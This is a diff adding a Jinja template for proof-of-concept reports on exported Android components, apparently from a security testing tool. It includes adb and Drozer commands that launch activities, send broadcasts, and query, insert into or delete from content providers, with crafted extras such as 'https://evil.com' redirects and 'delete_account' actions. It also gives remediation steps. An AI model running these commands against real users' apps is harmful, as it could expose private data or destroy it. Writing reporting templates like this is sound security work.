@@ -1,0 +1,132 @@
+# PoC: Exported Component — {{ finding.title }}
+
+## Classification
+| Field | Value |
+|---|---|
+| **CWE** | {{ cwe }} |
+| **Severity** | {{ severity }} |
+| **CVSS** | {{ cvss }} |
+| **Component** | {{ class_name }} |
+
+## Description
+{{ description }}
+
+## Prerequisites
+- Android device or emulator with ADB access
+- Target app (`{{ package_name }}`) installed
+- `adb` command-line tool
+- Optional: Drozer framework for advanced testing
+
+## Steps to Reproduce
+
+### 1. Verify Component is Exported
+```bash
+# Check if the component is exported
+adb shell dumpsys package {{ package_name }} | grep -A 10 "{{ class_name.split('.')[-1] if class_name else 'TargetActivity' }}"
+
+# List all exported components
+adb shell dumpsys package {{ package_name }} | grep -B 2 "exported=true"
+```
+
+{% if "Activity" in class_name or "activity" in class_name.lower() %}
+### 2. Launch Exported Activity
+```bash
+# Direct launch
+adb shell am start -n {{ package_name }}/{{ class_name }}
+
+# Launch with intent extras
+adb shell am start -n {{ package_name }}/{{ class_name }} \
+  --es "url" "https://attacker.com" \
+  --es "token" "test123" \
+  --ez "admin" true
+
+# Launch with data URI
+adb shell am start -n {{ package_name }}/{{ class_name }} \
+  -d "file:///data/data/{{ package_name }}/databases/app.db"
+```
+
+### 3. Test for Intent Injection
+```bash
+# Send crafted intents with sensitive parameters
+adb shell am start -n {{ package_name }}/{{ class_name }} \
+  --es "redirect_url" "https://evil.com" \
+  --ei "user_id" 1 \
+  --es "action" "delete_account"
+```
+{% endif %}
+
+{% if "Service" in class_name or "service" in class_name.lower() %}
+### 2. Interact with Exported Service
+```bash
+# Start the service
+adb shell am startservice -n {{ package_name }}/{{ class_name }}
+
+# Start with intent data
+adb shell am startservice -n {{ package_name }}/{{ class_name }} \
+  --es "command" "dump_data" \
+  --es "target" "/data/data/{{ package_name }}/databases/"
+```
+{% endif %}
+
+{% if "Receiver" in class_name or "receiver" in class_name.lower() %}
+### 2. Send Broadcast to Exported Receiver
+```bash
+# Send broadcast
+adb shell am broadcast -a {{ package_name }}.ACTION \
+  -n {{ package_name }}/{{ class_name }}
+
+# Send with extras
+adb shell am broadcast -a {{ package_name }}.ACTION \
+  -n {{ package_name }}/{{ class_name }} \
+  --es "command" "execute" \
+  --es "data" "sensitive_payload"
+```
+{% endif %}
+
+{% if "Provider" in class_name or "provider" in class_name.lower() %}
+### 2. Query Exported Content Provider
+```bash
+# Query the provider
+adb shell content query --uri content://{{ class_name }}/
+
+# Insert data
+adb shell content insert --uri content://{{ class_name }}/ \
+  --bind name:s:test --bind value:s:injected
+
+# Delete data
+adb shell content delete --uri content://{{ class_name }}/
+```
+{% endif %}
+
+### 4. Advanced Testing with Drozer (Optional)
+```bash
+# Install drozer agent on device, then:
+drozer console connect
+
+# Find attack surface
+dz> run app.package.attacksurface {{ package_name }}
+
+# Test exported activities
+dz> run app.activity.info -a {{ package_name }}
+dz> run app.activity.start --component {{ package_name }} {{ class_name }}
+
+# Test for intent injection
+dz> run scanner.activity.browsable -a {{ package_name }}
+```
+
+## Expected Result
+- The exported component accepts and processes intents from any app on the device
+- No permission check prevents unauthorized access
+- Sensitive functionality or data is accessible without authentication
+
+## Impact
+{% if "CWE-926" in cwe %}
+Any malicious app installed on the same device can interact with this exported component without any permission restrictions. This could allow unauthorized access to sensitive features, data theft, or privilege escalation.
+{% elif "CWE-927" in cwe %}
+The PendingIntent created by this component lacks FLAG_IMMUTABLE, allowing a receiving app to modify the intent's action, data, or extras. This can be exploited for privilege escalation or redirecting sensitive operations.
+{% else %}
+Unauthorized access to the exported component can lead to data leakage, privilege escalation, or denial of service.
+{% endif %}
+
+## Remediation
+{{ remediation or "1. Set `android:exported=\"false\"` if the component doesn't need external access\n2. Add `android:permission` attribute with a custom signature-level permission\n3. Validate all incoming intent data and extras\n4. Use `PendingIntent.FLAG_IMMUTABLE` for all PendingIntents\n5. Implement runtime permission checks with `checkCallingPermission()`" }}
